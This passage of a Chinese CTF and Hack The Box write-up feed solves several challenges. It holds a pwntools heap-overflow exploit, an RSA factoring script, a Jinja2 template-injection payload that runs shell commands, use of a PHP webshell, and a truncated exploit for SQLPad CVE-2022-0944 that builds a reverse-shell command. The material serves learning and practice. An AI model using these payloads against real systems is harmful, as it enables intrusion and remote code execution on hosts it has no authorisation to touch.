class="string">&#x27;E&#x27;</span>, <span class="number">0x07</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">0x08</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">0x09</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">0x0a</span>: <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x0b</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">0x0c</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">0x0d</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">0x0e</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">0x0f</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">0x10</span>: <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x11</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">0x12</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">0x13</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">0x14</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">0x15</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">0x16</span>: <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x17</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">0x18</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">0x19</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">0x1a</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">0x1b</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">0x1e</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x1f</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">0x20</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">0x21</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">0x22</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">0x23</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">0x24</span>: <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x25</span>: <span class="string">&#x27;h&#x27;</span>, <span class="number">0x26</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">0x27</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">0x28</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">0x29</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">0x2a</span>: <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x2b</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">0x2c</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">0x2d</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">0x2e</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">0x2f</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">0x30</span>: <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x31</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">0x32</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">0x33</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">0x34</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">0x35</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">0x36</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x37</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">0x38</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="number">0x39</span>: <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line"></span><br><span class="line">data = fp.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> byte == <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">flag += <span class="string">&quot;4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">flag += mapp.get(byte, <span class="string">&#x27;?&#x27;</span>) <span class="comment"># 若没有对应字符，输出‘?’</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;MTczMDc4MzQ2Ng==&#125;</span></span><br></pre></td></tr></table></figure><h2 id="pwn">pwn</h2><h3 id="anote">anote</h3><p>pwn签到题，存在后门函数，edit里存在溢出写漏洞，且edit完会调用fd上的指针函数(本来存的是puts函数)，因此可以通过溢出修改掉该指针函数，不过注意这里是间接调用。所以修改1的fd指向chunk0_data，修改chunk0_data为后门函数即可。</p><img src="/post/4051f994/IMAGE20241230235355720.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line">p.send(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>):</span><br><span class="line"></span><br><span class="line">p.sendafter(a, b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line">p.sendline(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(a, b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p.recv(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>(<span class="params">libc_base</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;39.105.123.22&#x27;,26759)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,data</span>):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;len: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;content: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;gift: 0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">7</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x80489CE</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x1c</span>,p32(backdoor) * <span class="number">4</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x21</span>) + p32(heap_base + <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="密码">密码</h2><h3 id="rasnd">rasnd</h3><p>两端flag。</p><p>第一段flag，x1和x2范围很小，可以直接爆破，通过爆破x1和x2，用i和j替代，可以得出q_ = (hint1 + 0x114) * i - (hint2 + 0x514) * j，其中q_ = k * q，和n取gcd即可求得q，之后常规rsa。</p><p>第二段flag，</p><p>由费马小定理推导可得，</p><p>(514×_p_−114×_q_)<em>n_−1≡1mod_n</em></p><p>(514×_p_−114×_q_)<em>n_−_p_−_q_≡(514×_p_−114×_q</em>)−1mod_n_</p><p>514×_p_−114×_q_=inverse(hint,<em>n</em>)</p><p>所以，联合514×_p_−114×_q_=inverse(hint,<em>n</em>)和p * q = n用sympy求解方程即可。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">23648865866967474741270370397132423067699850427877137954637744104915275862580729305752649659558903208704210520404455263487922574349344027608455219594970370136631537542988690942079596027410950309104210502316881241869253489791957580833197505343865871369332227319727036871601879356647931354999801556527525622386714474862274478072900776772849916088407385085172793529891976940198603667276046943913747882879444205337013047716443965133641695789732469801138839086918597765389860490103516114749193605536932674219305575208345984041924802827995594848795451094637394349237489219593447305188127031731811579960869233342752536100527</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">12871293048733428405921993001474578995576966407212209002496627586541981587684719987156443294124310716965280212719390338695202157815376863019064093567216994679080289411869769698877420309738539393058199884618426735251695293632309349130302017107525370437009808089940546467740239387244603064354072024228584137505815198672524214329434003062957282331772544865942114036138240427590282222587632491953027413817537467476211495107817229494683254318465555361112148153968926339393351690557655234472182328031652147228622097814985937486244681684439084740792730260943438322469368997572013403493837626811395296875828720042085253741244</span></span><br><span class="line"></span><br><span class="line">hint1 = <span class="number">2703642595294748564643622671649399553349260234587100086533241345261637498325534113322955496677225272148642070369301838312297245973046433308957535756264825008875364114414462464128235947776518582564921697809360918803644869806695489185714944767429577379660277801285524808124565008668088032699224448150409658247394175183890031779925039061797406792</span></span><br><span class="line"></span><br><span class="line">hint2 = <span class="number">2169410035515532906876819913960514081818308685030029528953082846373483240480780518798810730623580967118171766601339077609903728723280859124374334171316025172163690787871809134051967615896421514542191920476370854639765281638331517908871407380213580237559660767770824604364909376856664112138905994069463543058446850133401352199000299080386495040556940824325347535607774724849323181852372710392377956213046858908265330857740740847558701275465534872986005202129327090</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span> ** <span class="number">11</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span> ** <span class="number">11</span>):</span><br><span class="line"></span><br><span class="line">q_ = (hint1 + <span class="number">0x114</span>) * i - (hint2 + <span class="number">0x514</span>) * j</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> gmpy2.gcd(q_, n) != <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">q = gmpy2.gcd(q_, n)</span><br><span class="line"></span><br><span class="line">p = n // q</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (phi))</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> flag1</span><br><span class="line"></span><br><span class="line">flag1 = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">fun1()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">22902312247655401296387615153281693620508461675505550317014209779502324214659038625188644637684716596785654730362837135937428752578933369019876636781124643639177120407643147914932174261971465557310189161493208155563664026848239936362156630547829709710807347851602425752221503380034034698661113182854841894544095158900943963238561984113656414774368904280961218734260452412174079292884439126146014019436972752206205693555122285611179454949492032296806502438320826316045303787587136393481831244686573244792681592851889782650510393778231713816763010638656123304973975140552936712841614459233740391987488047517403600664177</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">10925650797594460612059722201596610933207264502326819848042775320957258158018275605482510808372512594051200222145936489078816364135810892640917713113068503152152242704988045516265090312225293558139219203431287178987229023062505356034246693655652192200324933320428405891200794854131034462963388024373314403868375571984277004371368582051660493956317530739125058003324429907207332861597713305361198480099466903431836693515104766242032956465615652468253631405615750342178243913852667249495988156267323915974111754007207991602051250521499638553489086363424935888718304716566925038325795617459612928478694750644540123489040</span></span><br><span class="line"></span><br><span class="line">hint3 = <span class="number">3855651325057194887972748506776457858934175512007314643076624103686879599280541006266987104821156151361711778969477814937770854325818184386384209471137555059136561996198802530628880456082386621118628839560185794434935871085733536602515294932732781224397538222047978348801727498256181418404928760447528350392887109183676665897758431671715736181046318754153743290687151730056417997835932648291568374055937072777280311412489299276441100000409306149688383961487334426823908899881912689052275547072583202669593768624681608263488675488219230004581882489398517548459754749590298003983834065191538258319844568477191703747977</span></span><br><span class="line"></span><br><span class="line">inverse_ = gmpy2.invert(hint3,n2)</span><br><span class="line"></span><br><span class="line">p2, q2 = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">equation_1 = Eq(<span class="number">514</span> * p2 - <span class="number">114</span> * q2, inverse_)</span><br><span class="line"></span><br><span class="line">equation_2 = Eq(p2 * q2, n2)</span><br><span class="line"></span><br><span class="line">solution = solve([equation_1, equation_2], [q2, p2])</span><br><span class="line"></span><br><span class="line">prime_p1 = <span class="built_in">int</span>(<span class="built_in">abs</span>(solution[<span class="number">1</span>][<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">prime_q2 = <span class="built_in">int</span>(<span class="built_in">abs</span>(solution[<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">d2 = inverse(<span class="number">65537</span>, (prime_p1 - <span class="number">1</span>) * (prime_q2 - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">flag2 = long_to_bytes(<span class="built_in">pow</span>(c2, d2, n2))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag1 + flag2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Web">Web</h2><h3 id="Safe-Proxy">Safe_Proxy</h3><p>这题直接把源码dump下来看看</p><img src="/post/4051f994/IMAGE20241230235453296.png" class=""><p>主要需要进行post传参数可以考虑的是python内存🐎但是这里没有尝试出来,这些过滤的字符可以用16进制绕过</p><img src="/post/4051f994/IMAGE20241230235503193.png" class=""><p><a href="http://xn--app-tu9dn1ma602aji835d1mlnim0v9b1tea80fa8351fda133iqhuolj545a.py">只尝试到这里后面想到用文件覆盖看看覆盖app.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%25<span class="built_in">set</span>%<span class="number">20</span><span class="built_in">globals</span>=<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;globals&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>%<span class="number">25</span>%7D%7B%25<span class="built_in">set</span>%20builtins=<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%7D%7B%25<span class="built_in">set</span>%20impor=<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;i&#x27;</span><span class="string">&#x27;mport&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%7D%7B%25<span class="built_in">set</span>%20command=<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>%<span class="number">25</span>%7D%7B%7Bcycler.<span class="built_in">next</span>%5Bglobals%5D%5Bbuiltins%5D%5Bimpor%5D(command)%5<span class="string">B&#x27;s&#x27;</span><span class="string">&#x27;ystem&#x27;</span>%5D(<span class="string">&#x27;cat%20/flag%20%3E%20app.py&#x27;</span>)%7D%7D%0A</span><br></pre></td></tr></table></figure><img src="/post/4051f994/IMAGE20241230235514424.png" class="">再次访问首页<img src="/post/4051f994/IMAGE20241230235533473.png" class=""><h3 id="hello-web">hello_web</h3><p>访问直接跳转到</p><p>file</p><img src="/post/4051f994/IMAGE20241230235547223.png" class=""><p>这里请求头是有提示的是html加密的include.php文件。所以尝试文件包含，源码理由hackme.php tips.php</p><img src="/post/4051f994/IMAGE20241230235556033.png" class=""><p>Tips是一个phpinfo页面</p><img src="/post/4051f994/IMAGE20241230235609075.png" class=""><p>解密一下混淆代码</p><img src="/post/4051f994/IMAGE20241230235631273.png" class=""><p>发现是一个一句话木马所以进行连接</p><img src="/post/4051f994/IMAGE20241230235639003.png" class=""><p>因为有_所以用[绕过</p><img src="/post/4051f994/IMAGE20241230235648858.png" class=""><p>使用php7_UserFilter插件绕过<br>然后find / -name flag 即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;威胁检测与网络流量分析&quot;&gt;威胁检测与网络流量分析&lt;/h2&gt;
&lt;h3 id=&quot;zeroshell-1&quot;&gt;zeroshell_1&lt;/h3&gt;
&lt;p&gt;在流量的Referer里，CTF-NETA能秒&lt;/p&gt;
&lt;img src=&quot;/post/4051f994/IMAGE202</summary>
      
    
    
    
    <category term="CTF" scheme="https://oceanzbz.github.io/categories/CTF/"/>
    
    
    <category term="CTFWP" scheme="https://oceanzbz.github.io/tags/CTFWP/"/>
    
  </entry>
  
  <entry>
    <title>Sightless</title>
    <link href="https://oceanzbz.github.io/post/3664201d.html"/>
    <id>https://oceanzbz.github.io/post/3664201d.html</id>
    <published>2024-12-30T07:25:02.000Z</published>
    <updated>2025-03-05T07:24:36.811Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -sC -sV -O <span class="number">10.10</span><span class="number">.11</span><span class="number">.32</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>扫描结果如下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734147903011-ffa92bfa-0cfe-4a40-879c-4e8817abd865.png" alt=""></p><p>可以看到开放了ftp端口和80端口还有一个域名,先把域名添加到hosts里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734150868038-55569533-f486-4de7-b56f-5826a88b1250.png" alt=""></p><p>尝试ftp匿名登录发现失败了，所以来看看网站。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734150992689-89ee74ce-8863-4860-bf24-f295eb32c177.png" alt=""></p><p>查看页面源码发现了一个子域名，也给加入到hosts里，然后访问一下这个子域名</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734151323300-0bfd42bc-9a61-4d07-adae-843eb1047b65.png" alt=""></p><p>这里会显示sqlpad的版本号</p><h2 id="漏洞利用">漏洞利用</h2><p>去网上找一下看看sqlpad的漏洞</p><p><a href="https://github.com/worm-403/scripts">https://github.com/worm-403/scripts</a></p><p><a href="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944">https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944</a></p><p>这里有一个rce漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">#Remember to put the Netcat on the listening port</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">IP=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">PORT=<span class="string">&quot;<span class="variable">$&#123;2&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ -z <span class="string">&quot;<span class="variable">$&#123;@&#125;</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Add IP and PORT&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Example: ./exploit.sh IP PORT&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload=$(<span class="built_in">cat</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;worm&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;driver&quot;: &quot;mysql&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;data&quot;: &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;database&quot;: &quot;&#123;&#123; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;/bin/bash 